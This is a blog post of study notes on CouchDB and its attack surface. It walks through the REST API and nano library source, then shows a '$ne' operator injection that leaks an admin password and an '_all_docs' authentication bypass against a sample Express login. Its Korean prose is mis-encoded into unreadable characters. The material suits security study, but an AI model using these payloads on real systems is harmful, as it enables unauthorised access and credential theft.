---
title: "[2025-07-20] CouchDB"
excerpt: "CouchDB ê°œë… ì •ë¦¬"

categories:
  - Justice
tags:
  - [SQL Injection]

permalink: /Justice/[2025-07-20] CouchDB/

toc: true
toc_sticky: true

date: 2025-07-20
last_modified_at: 2025-07-20
---

## ğŸ¦¥ ë³¸ë¬¸

key-value ê°’ì„ ë°ì´í„°ë¡œ ì €ì¥. JSON ê°ì²´ í˜•íƒœì¸ ë„íë¨¼íŠ¸ë¥¼ ì €ì¥í•œë‹¤. HTTP ê¸°ë°˜ì˜ ì„œë²„ë¡œ ë™ì‘í•˜ë©° REST API í˜•ì‹ìœ¼ë¡œ HTTP ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•´ ìš”ì²­ ë°›ê³  ì²˜ë¦¬.

```sql
$ curl http://127.0.0.1:5984/
{"couchdb":"Welcome","version":"3.1.0","git_sha":"ff0feea20","uuid":"c7592f66bba3c6ebc38f0f4dcd374d68","features":["access-ready","partitioned","pluggable-storage-engines","reshard","scheduler"],"vendor":{"name":"The Apache Software Foundation"}}
```

- ë°ì´í„° ì‚½ì…
    
    ```sql
    $ curl -X PUT http://{username}:{password}@localhost:5984/users/guest -d '{"upw":"guest"}'
    {"ok":true,"id":"guest","rev":"1-22a458e50cf189b17d50eeb295231896"}
    ```
    
- ë°ì´í„° ì¡°íšŒ
    
    ```sql
    $ curl http://{username}:{password}@localhost:5984/users/guest
    {"_id":"guest","_rev":"1-22a458e50cf189b17d50eeb295231896","upw":"guest"}
    ```
    

### íŠ¹ìˆ˜ êµ¬ì„± ìš”ì†Œ

`_` ë¬¸ìë¡œ ì‹œì‘í•˜ëŠ” url ìš”ì†Œ ë° JSON í•„ë“œ

- Server

| êµ¬ì„± ìš”ì†Œ | ì„¤ëª… |
| --- | --- |
| `/` | ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ ë©”íƒ€ ì •ë³´ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. |
| `/_all_dbs` | ì¸ìŠ¤í„´ìŠ¤ì˜ ë°ì´í„°ë² ì´ìŠ¤ ëª©ë¡ì„ ë°˜í™˜í•©ë‹ˆë‹¤. |
| `/_utils` | ê´€ë¦¬ì í˜ì´ì§€(Fauxton Administration Interface)ë¡œ ì´ë™í•©ë‹ˆë‹¤. |
- Databases

| êµ¬ì„± ìš”ì†Œ | ì„¤ëª… |
| --- | --- |
| `/db` | ì§€ì •í•œ ë°ì´í„°ë² ì´ìŠ¤ì— ëŒ€í•œ ì •ë³´ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. |
| `/{db}/_all_docs` | ì§€ì •í•œ ë°ì´í„°ë² ì´ìŠ¤ì— í¬í•¨ëœ ëª¨ë“  ë„íë¨¼íŠ¸ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. |
| `/{db}/_find` | ì§€ì •í•œ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ JSON ì¿¼ë¦¬ì— í•´ë‹¹í•˜ëŠ” ëª¨ë“  ë„íë¨¼íŠ¸ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. |

### ê³µê²© ê¸°ë²•

NodeJSì—ì„œ CouchDBë¥¼ ì‚¬ìš©í•  ë•Œì—ëŠ” `nano` íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©. `nano` íŒ¨í‚¤ì§€ëŠ” `get` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¡°íšŒ, `find` í•¨ìˆ˜ë¥¼ í†µí•´ ë°ì´í„°ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤.  

- `get` í•¨ìˆ˜
    
    ```sql
    // { ..., get: getDoc, ...}
    // https://github.com/apache/couchdb-nano/blob/befbcd9972520faa8850c9425faeb324aab005f5/lib/nano.js#L543-L552
    // http://docs.couchdb.org/en/latest/api/document/common.html#get--db-docid
    function getDoc (docName, qs0, callback0) {
      const { opts, callback } = getCallback(qs0, callback0)
      if (missing(docName)) {
        return callbackOrRejectError(callback)
      }
      return relax({ db: dbName, doc: docName, qs: opts }, callback)
    }
    // ...
    function relax (opts, callback) {
      // ...
      const req = {
        method: (opts.method || 'GET'),
        headers: headers,
        uri: cfg.url
      }
      // ...
      if (opts.db) {
        req.uri = urlResolveFix(req.uri, encodeURIComponent(opts.db))
      }
      // ...
      if (opts.path) {
        req.uri += '/' + opts.path
      } else if (opts.doc) {
        if (!/^_design|_local/.test(opts.doc)) {
          // http://wiki.apache.org/couchdb/HTTP_Document_API#Naming.2FAddressing
          req.uri += '/' + encodeURIComponent(opts.doc)
        } else {
          // http://wiki.apache.org/couchdb/HTTP_Document_API#Document_IDs
          req.uri += '/' + opts.doc
        }
        // http://wiki.apache.org/couchdb/HTTP_Document_API#Attachments
        if (opts.att) {
          req.uri += '/' + opts.att
        }
      }
      // ...
        if (typeof callback === 'function') {
          // return nothing - feedback via the callback function
          httpAgent(req, responseHandler(req, opts, null, null, callback))
        } else {
          // return a Promise
          return new Promise(function (resolve, reject) {
            httpAgent(req, responseHandler(req, opts, resolve, reject))
          })
        }
      }
    }
    ```
    
    - `relax` í•¨ìˆ˜ì˜ 21ë²ˆì§¸ ì¤„ì„ ë³´ë©´ ì´ˆê¸°í™” ê³¼ì •ì—ì„œ í• ë‹¹ëœ `cfg.url` ë’¤ì— DB ì´ë¦„ì„ í•©ì¹˜ê³  32ë²ˆì§¸ ì¤„ì—ì„œ ì…ë ¥ë°›ì€ `doc`ì„ URLì˜ˆ ì¶”ê°€í•œë‹¤.
    - _all_docs í˜ì´ì§€ ì ‘ê·¼ :  ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ ì¡°íšŒ
        
        ```sql
        // ì •ìƒì ì¸ ìš”ì²­
        > require('nano')('http://{username}:{password}@localhost:5984').use('users').get('guest', function(err, result){ console.log('err: ', err, ',result: ', result) })
        /*
        err:  null ,result:  { _id: 'guest',
          _rev: '1-22a458e50cf189b17d50eeb295231896',
          upw: 'guest' }
        */
        
        //_all_docs í˜ì´ì§€ ì ‘ê·¼
        > require('nano')('http://{username}:{password}@localhost:5984').use('users').get('_all_docs', function(err, result){ console.log('err: ', err, ',result: ', result) })
        /*
        err:  null ,result:  { total_rows: 3,
          offset: 0,
          rows:
           [ { id: '0c1371b65480420e678d00c2770003f3',
               key: '0c1371b65480420e678d00c2770003f3',
               value: [Object] },
             { id: '0c1371b65480420e678d00c277001712',
               key: '0c1371b65480420e678d00c277001712',
               value: [Object] },
             { id: 'guest', key: 'guest', value: [Object] } ] }
        */
        ```
        
- `find` í•¨ìˆ˜
    
    ```sql
    // https://github.com/apache/couchdb-nano/blob/befbcd9972520faa8850c9425faeb324aab005f5/lib/nano.js#L941-L952
    function find (query, callback) {
      if (missing(query) || typeof query !== 'object') {
        return callbackOrRejectError(callback)
      }
      return relax({
        db: dbName,
        path: '_find',
        method: 'POST',
        body: query
      }, callback)
    }
    ```
    
    - ì¿¼ë¦¬ê°€ NULLì¸ì§€ì™€ ê°ì²´ íƒ€ì…ì¸ì§€ë¥¼ ê²€ì‚¬
    - ì—°ì‚°ì ê³µê²© : `selector` ì•ˆì—ì„œ ì—°ì‚°ìë¥¼ ì‚¬ìš©
        
        ```sql
        // ì •ìƒì ì¸ ìš”ì²­
        > require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'guest', 'upw': 'guest'}}, function(err, result){ console.log('err: ', err, ',result: ', result) })
        /*
        undefined
        err:  null ,result:  { docs:
           [ { _id: 'guest',
               _rev: '1-22a458e50cf189b17d50eeb295231896',
               upw: 'guest' } ],
          bookmark:
           'g1AAAAA6eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzppemFpeAJDlgkgjhLADZAxEP',
          warning:
           'No matching index found, create an index to optimize query time.' }
        */
        
        // ì—°ì‚°ìë¥¼ í¬í•¨í•œ ê³µê²© ì¿¼ë¦¬ ì „ì†¡
        > require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'admin', 'upw': {'$ne': ''}}}, function(err, result){ console.log('err: ', err, ',result: ', result) })
        /*
        undefined
        err:  null ,result:  { docs:
           [ { _id: 'admin',
               _rev: '2-142ddb6e06fd298e86fa54f9b3b9d7f2',
               upw: 'secretpassword' } ],
          bookmark:
           'g1AAAAA6eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzJqbkZuaBJDlgkgjhLADVNBDR',
          warning:
           'No matching index found, create an index to optimize query time.' }
        */
        ```
        
- ê¸°íƒ€ ê³µê²© ë°©ë²•
    
    ```sql
    const express = require('express');
    const session = require('express-session');
    const app = express();
    app.use(express.json());
    app.use(express.urlencoded({extended: false}));
    app.use(session({'secret': 'secret'}));
    const nano = require('nano')('http://{username}:{password}@localhost:5984');
    const users = nano.db.use('users');
    // { _id: 'admin', _rev: '1-22a458e50cf189b17d50eeb295231896', upw: '**secret**' }
    app.post('/auth', function(req, res) {
        users.get(req.body.uid, function(err, result) {
            if (err) {
                res.send('error');
                return;
            }
            if (result.upw === req.body.upw) {
                req.session.auth = true;
                res.send('success');
            } else {
                res.send('fail');
            }
        });
    });
    const server = app.listen(3000, function() {
        console.log('app.listen');
    });
    ```
    
    - uidì— í•´ë‹¹í•˜ëŠ” ë°ì´í„° ì¡°íšŒí•˜ê³  ë¡œê·¸ì¸ ì‹¤íŒ¨ ì‹œ ì—ëŸ¬ ë°œìƒí•˜ëŠ” ì½”ë“œ
    - _all_docsë¥¼ ì´ìš©í•œ ì¸ì¦ ìš°íšŒ : uidì— _all_docs ì…ë ¥í•˜ê³  upwëŠ” ì…ë ¥í•˜ì§€ ì•ŠìŒ
        
        ```sql
        $ curl -i http://{username}:{password}@localhost:5984/users/_all_docs
        HTTP/1.1 200 OK
        Cache-Control: must-revalidate
        Content-Type: application/json
        Date: Tue, 19 May 2020 17:24:32 GMT
        Server: CouchDB/3.1.0 (Erlang OTP/20)
        Transfer-Encoding: chunked
        X-Couch-Request-ID: 43c8ca548f
        X-CouchDB-Body-Time: 0
        {"total_rows":1,"offset":0,"rows":[
        {"id":"admin","key":"admin","value":{"rev":"2-142ddb6e06fd298e86fa54f9b3b9d7f2"}}
        ]}
        ```